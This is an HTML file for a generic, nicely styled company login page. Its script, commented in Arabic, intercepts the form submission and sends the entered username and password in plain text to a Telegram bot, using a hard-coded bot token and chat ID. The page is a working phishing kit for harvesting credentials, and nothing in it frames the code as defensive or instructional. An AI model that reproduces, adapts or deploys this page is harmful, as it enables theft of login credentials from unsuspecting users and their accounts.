<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Page</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #4f46e5, #3b82f6);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-container {
      background-color: white;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
    }

    .login-container h2 {
      text-align: center;
      margin-bottom: 1.5rem;
      color: #111827;
    }

    .form-group {
      margin-bottom: 1rem;
    }

    .form-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 600;
      color: #374151;
    }

    .form-group input {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #d1d5db;
      border-radius: 0.5rem;
      font-size: 1rem;
      outline: none;
      transition: 0.3s;
    }

    .form-group input:focus {
      border-color: #2563eb;
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.3);
    }

    .btn {
      width: 100%;
      padding: 0.75rem;
      background-color: #2563eb;
      color: white;
      border: none;
      border-radius: 0.5rem;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .btn:hover {
      background-color: #1d4ed8;
    }

    .footer {
      text-align: center;
      margin-top: 1rem;
      color: #6b7280;
      font-size: 0.875rem;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Login</h2>
    <form id="loginForm" onsubmit="sendData(event)">
      <div class="form-group">
        <label for="username">Username or Email</label>
        <input type="text" id="username" name="username" required />
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required />
      </div>
      <button type="submit" class="btn">Login</button>
    </form>
    <div class="footer">
      &copy; 2025 Your Company. All rights reserved.
    </div>
  </div>

  <script>
    // هذه الدالة تُنفذ عندما يُرسل النموذج
    function sendData(event) {
        // منع إرسال النموذج بشكل افتراضي
        event.preventDefault();

        // استخراج البيانات من النموذج
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // تكوين الرسالة التي سترسل إلى Telegram
        const message = `تم تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;

        // إرسال البيانات إلى Telegram عبر API
        const botToken = '7883105519:AAFQdf8KtmeAXS02nCcpAe_0rhOgpj1cfSc'; // استبدل بـ token الخاص بك
        const chatId = '6773579568'; // استبدل بـ chat id الخاص بك

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        // استخدام fetch لإرسال البيانات إلى Telegram
        fetch(telegramUrl)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert('تم إرسال البيانات إلى Telegram!');
                } else {
                    alert('حدث خطأ أثناء إرسال البيانات.');
                }
            })
            .catch(error => {
                alert('حدث خطأ في الاتصال: ' + error);
            });
    }
  </script>
</body>
</html>
